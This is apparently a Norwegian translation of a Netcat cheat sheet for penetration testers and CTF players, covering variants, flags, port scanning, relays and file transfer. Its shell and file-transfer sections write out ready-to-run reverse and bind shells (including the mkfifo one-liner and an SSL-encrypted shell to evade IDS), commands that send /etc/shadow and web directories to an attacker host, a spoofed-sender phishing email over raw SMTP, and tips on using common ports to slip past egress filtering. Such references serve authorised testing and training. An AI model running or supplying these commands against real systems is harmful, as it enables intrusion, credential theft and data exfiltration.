<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🔌 Netcat (nc) - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```
<p align="center">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Protokoller TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="License">
</p>

<p align="center">
  <b>🌐 Les og skriv rådata på tvers av nettverkstilkoblinger ved hjelp av TCP- og UDP-protokoller</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og The Netcat-filosofien](#-oversikt--the-netcat-filosofien)
- [Netcat Variants & The Flavour Dilemma](#-netcat-varianter--the-flavor-dilemma)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Traditional Netcat (`nc.traditional`)](#traditional-netcat-nctraditional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [Tool Comparison: Netcat Variants vs Socat](#-tool-comparison-netcat-variants-vs-socat)
- [Installasjons- og byttevarianter](#-installasjon--bytte-varianter)
- [Kjernekommandolinjeflagg](#-kjernekommandolinjeflagg)
- [Portskanning og bannerfanging](#-port-skanning--banner-grabbing)
- [Reverse & Bind Shells](#-reverse--bind-shells)
  - [Traditional Shell Execution (`-e`)](#traditional-shell-execution--e)
  - [OpenBSD FIFO navngitt pipe reverse shell](#openbsd-fifo-named-pipe-reverse-shell)
  - [OpenBSD FIFO Bind Shell](#openbsd-fifo-bind-shell)
  - [Kryptert TLS-skall med Ncat (`--ssl`)](#encrypted-tls-shell-with-ncat---ssl)
- [File Transfer Techniques](#-file-transfer-techniques)
  - [Target to Attacker (Exfiltration)](#target-to-attacker-exfiltration)
  - [Angriper til mål (levering av nyttelast)](#angriper-til-mål-nyttelast-levering)
  - [On-the-Fly Directory Archiving (`tar + nc`)](#on-the-fly-directory-archiving-tar--nc)
- [Portvideresending og nettverksreléer](#-portvideresending--nettverksreleer)
- [Nettserver og Honeypot-emulering](#-nettserver--honeypot-emulering)
– [Nettverksfeilsøking og manuell protokollinteraksjon](#-nettverksfeilsøking--manuell-protokoll-interaksjon)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & OPSEC](#-defensive-considerations--opsec)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt og Netcat-filosofien

Opprinnelig skrevet i 1995 av **Hobbit**, **Netcat** (ofte bare kalt `nc`) feires på tvers av cybersikkerhets- og Unix-miljøene som **"TCP/IP Swiss Army Knife"**. 

I motsetning til applikasjonsprotokoller på høyt nivå eller oppblåste administrasjonsverktøy, gjør Netcat én ting eksepsjonelt bra: **den åpner nettverksrør på rå bytenivå over TCP- eller UDP-sokler og kobler dem direkte til standardinngang (`stdin`) og standardutgang (`stdout`)**.

Enten du lytter etter omvendte skjell, etablerer skjulte eksfiltreringskanaler, bannergrabbing-tjenester, overfører filer uten SMB/FTP, eller diagnostiserer pakkefiltrering for brannmurer, er Netcat fortsatt et uunnværlig verktøy i enhver sikkerhetsutøvers arsenal.

---

## ⚖️ Netcat Variants & The Flavour Dilemma

En av de hyppigste kildene til forvirring under penetrasjonstester og CTF-utfordringer er at **flere distinkte implementeringer deler `nc`-kommandoen**. Å forstå hvilken variant du samhandler med, dikterer syntaks- og nyttelastmulighetene.
```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```
### OpenBSD Netcat (`nc.openbsd`)
- **Standard på:** Kali Linux, Debian, Ubuntu, Linux Mint.
- **Nøkkeltrekk:** Som standard kompilert uten `-e` (kjør program)-flagget for å forhindre trivielle sårbarheter ved kjøring av vilkårlig kode.
- **Identifiseringssyntaks:**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Løsning for skjellutførelse:** Bruker Linux-navngitte pipes (`mkfifo`) for å bygge bro mellom `stdin` og `stdout` tilbake til `/bin/sh`.

### Tradisjonell Netcat (`nc.traditional`)
- **Original forfatter:** Hobbit (v1.10).
- **Nøkkeltrekk:** Kompilert med `-DGAPING_SECURITY_HOLE`-direktivet, som tillater det opprinnelige `-e` / `-c`-flagget (`nc -e /bin/bash`).
- **Identifiseringssyntaks:**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```
### Nmap Ncat (`ncat`)
- **Vedlikeholdt av:** Gordon Lyon (Fyodor) / The Nmap Project.
- **Nøkkeltrekk:** En moderne omskrivning som støtter **TLS/SSL-kryptering**, IP-tilgangskontrolllister (`--allow`, `--deny`), tilkoblingsmegling (`--broker`), SOCKS4/5-proxying og native kjøring på tvers av plattformer.

---

## ⚖️ Verktøysammenligning: Netcat-varianter vs Socat

| Funksjon | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmap) | `socat` |
|--------|----------------|---------------------|--------|--------|
| **Kjørbart flagg (`-e`)** | ❌ Strippet | ✅ Innfødt (`-e`) | ✅ Native (`-e`, `--exec`) | ✅ Innfødt (`EXEC:`) |
| **SSL / TLS-kryptering** | ❌ Nei | ❌ Nei | ✅ Innfødt (`--ssl`) | ✅ Native (`OPENSSL:`) |
| **FIFO rørskall** | ✅ Ja (`mkfifo`) | ✅ Ja | ✅ Ja | ✅ Ja |
| **Portskannemodus** | ✅ Ja (`-z`) | ✅ Ja (`-z`) | ❌ Nei | ❌ Nei |
| **Vedvarende lytter** | ✅ Ja (`-k`) | ❌ Nei (utganger ved frakobling) | ✅ Ja (`-k`, `--keep-open`) | ✅ Ja (`fork`) |
| **IPv6-støtte** | ✅ Native (`-6`) | ❌ Begrenset | ✅ Innfødt (`-6`) | ✅ Innfødt |
| **Proxy / SOCKS-klient** | ✅ Ja (`-X`, `-x`) | ❌ Nei | ✅ Ja (`--proxy`) | ✅ Full proxy-støtte |
| **Multi-Client Chat / Megler**| ❌ Nei | ❌ Nei | ✅ Native (`--broker`) | ❌ Manuelt oppsett |
| **Standard på Kali / Debian** | ✅ Ja (`/bin/nc`) | 🔄 Tilgjengelig (`apt`) | 🔄 Tilgjengelig (`ncat`) | 🔄 Tilgjengelig (`socat`) |

---

## 📥 Installasjon og byttevarianter

På Debian-baserte distribusjoner (inkludert Kali Linux), kan du installere alle smaker og bytte mellom dem via `update-alternatives`:
```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```
For å eksplisitt kjøre en spesifikk variant uten å endre systemomfattende standardinnstillinger:
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```
---

## ⚙️ Kjernekommandolinjeflagg

| Flagg | Betydning og beskrivelse |
|------|----------------------|
| `-l` | **Lyttemodus**: Vent på innkommende tilkoblinger i stedet for å starte utgående. |
| `-v` | ** Utførlig modus**: Skriv ut detaljert tilkoblings- og diagnostisk informasjon (`-vv` for høyere detaljerthet). |
| `-n` | **Kun numerisk IP**: Deaktiver omvendt DNS-oppløsning for hastighet og sniking. |
| `-p <port>` | **Lokal port**: Spesifiser den lokale porten du vil binde eller lytte på. |
| `-u` | **UDP-modus**: Bruk UDP-protokoll i stedet for standard TCP-strøm. |
| `-k` | **Fortsett å lytte**: Fortsett å lytte og godta nye tilkoblinger etter at en klient har koblet fra. |
| `-w <sec>` | **Tidsavbrudd**: Tidsavbrudd i sekunder for opprettelse av tilkobling og avlesning av ledig socket. |
| `-z` | **Null-I/O-modus**: Skannemodus; send ingen nyttelastdata og lukk kontakten umiddelbart etter håndtrykk. |
| `-q <sec>` | **Avslutt etter EOF**: Vent spesifiserte sekunder etter å ha mottatt EOF på `stdin` før du avslutter. |
| `-s <ip>` | **Kilde-IP**: Bind til et spesifikt lokalt grensesnitt / kilde-IP-adresse. |
| `-4` / `-6` | Tving kun IPv4- eller IPv6-adressering. |

---

## 🔍 Portskanning og bannerfanging

Mens dedikerte verktøy som `nmap` eller `masscan` foretrekkes for omfattende sveip, gir Netcat en umiddelbar portsjekk med null avhengighet når du lander på et begrenset mål.

### Rask portskanning
```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```
### Tjenestebanner

Bannergrabbing trekker ut råversjonsstrenger fra eksterne demoner for sårbarhetsidentifikasjon:
```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```
---

## 💀 Omvendt og bind skjell

Å koble til en ekstern kommandotolk (`/bin/sh`, `/bin/bash`, `cmd.exe`) over en Netcat-kontakt er en av de mest grunnleggende penetrasjonstestingsteknikkene.

### Tradisjonell Shell-utførelse (`-e`)

Hvis målsystemet har `netcat-traditional` eller `ncat` installert med kjøringsstøtte:
```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```
### OpenBSD FIFO kalt Pipe Reverse Shell

På moderne Debian-, Ubuntu-, Kali- og Fedora-distribusjoner mangler `nc` `-e`-flagget. Bruk en **FIFO (First-In-First-Out) kalt pipe** for å omdirigere standardinndata og standardutgang:
```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```
#### Slik fungerer FIFO-rørledningen:
1. `rm -f /tmp/f`: Fjerner enhver gammel rørfil.
2. `mkfifo /tmp/f`: Oppretter et spesielt navngitt FIFO-rør i `/tmp`.
3. `cat /tmp/f`: Leser input levert inn i røret og videresender det til `/bin/sh -i`.
4. `| /bin/sh -i 2>&1`: Skaper et interaktivt skall som omdirigerer standardfeil (`stderr`) til standardutgang (`stdout`).
5. `| nc 10.10.14.5 4444 >/tmp/f`: Sender skallutgangen over nettverket til angriperen, mens du skriver mottatte nettverkstastetrykk tilbake til `/tmp/f`.

### OpenBSD FIFO Bind Shell

Når målet har en rutebar offentlig eller lokal IP, og regler for innkommende brannmur tillater trafikk:
```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```
### Kryptert TLS-skall med Ncat (`--ssl`)

Ukryptert Netcat-trafikk kan inspiseres av IDS/IPS og nettverkskraner. `ncat` støtter TLS/SSL-kryptering naturlig:
```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```
---

## 📁 Filoverføringsteknikker

Når SSH, SCP, FTP og SMB er blokkert eller avinstallert, gir Netcat en umiddelbar, toveis filoverføringspipeline over enhver åpen TCP-port.

### Mål til angriper (eksfiltrering)
```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```
### Angriper til mål (levering av nyttelast)
```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```
### Integritetsverifisering (sjekksummer)

Verifiser alltid byteintegritet etter rå Netcat-overføringer:
```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```
### On-the-Fly Directory Arkivering (`tar + nc`)

Overfør hele katalogstrukturer uten å lage mellomliggende midlertidige arkivfiler på offerets disk:
```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```
---

## 🔀 Portvideresending og nettverksreleer

Netcat kan fungere som et lett nettverksrelé uten å kreve videresending av SSH-porter:
```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```
---

## 🌐 Webserver og Honeypot-emulering

### Minimalistisk enkeltfil HTTP-server

Server en statisk HTTP-nyttelast eller fange opp legitimasjon sendt av nettlesere:
```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```
### Multi-Client Chat / Message Broker (`ncat`)

Ncat inkluderer en innebygd meglermodus som skaper et ad-hoc IRC-lignende stafettrom for operatører av røde lag:
```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```
---

## 🛠️ Nettverksfeilsøking og manuell protokollinteraksjon

### Raw SMTP Mail Injection
```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```
### Rå POP3-posthenting
```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```
---

## ⚡ Hurtigreferansetabell

| Mål | Kommando |
|----------------|--------|
| **Standard lytter** | `nc -lvnp <PORT>` |
| **Vedvarende lytter** | `nc -lvnp <PORT> -k` |
| **Koble til ekstern vert** | `nc -vn <HOST> <PORT>` |
| **Koble til via UDP** | `nc -u -vn <HOST> <PORT>` |
| **Port Scan TCP (Rask)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **Port Scan UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **OpenBSD Navnet Pipe Shell** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Tradisjonelt skall (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Kryptert SSL-skall (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Motta fil (Exfil Listener)**| `nc -lvnp <PORT> > output_file` |
| **Send fil (Exfil Sender)** | `nc -vn <IP> <PORT> < input_file` |
| **Strømmappe via Tar** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| ** Trekk ut strømmet mappe** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Tanking av banner** | `nc -vn -w 2 <HOST> <PORT>` |

---

## 🛡️ Defensive betraktninger og OPSEC

1. **Ukryptert klartekstadvarsel:**
   - Standard Netcat bruker **ikke** kryptografisk innkapsling. Eventuelle passord, økttokens eller skallkommandoer sendt over klartekst `nc` kan trekkes ut av Network Security Monitoring (NSM) sensorer (Zeek, Suricata, Wireshark).
   - Bruk `ncat --ssl` eller pakk trafikk inn i en SSH/TLS-tunnel når det er mulig.
2. **Prosessrevisjon og Sysmon:**
   - På Linux-systemer flagger prosessutførelseslogging (`auditd`, eBPF, Falco) anrop av `nc` som inneholder flagg som `-e` eller kommandoer som oppretter `/tmp/f` og `mkfifo`.
   - På Windows flagger eller setter EDR-agenter rutinemessig `nc.exe`-binærfiler i karantene på grunn av kjente statiske signaturer.
3. **Inngående restriksjoner for brannmur:**
   - Velg alltid vanlige utgående porter (`80`, `443`, `53`) når du konfigurerer reverse shell-lyttere for å omgå strenge retningslinjer for utgangsfiltrering.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Dette juksearket er kun laget for autorisert penetrasjonstesting, sårbarhetsvurdering, CTF-konkurranser og systemadministrasjon. Å avskjære nettverkstrafikk, eksfiltrere data eller utføre omvendte skall mot systemer uten eksplisitt skriftlig samtykke er ulovlig og straffbart i henhold til nettsikkerhetslover over hele verden. Bruk ansvarlig og etisk.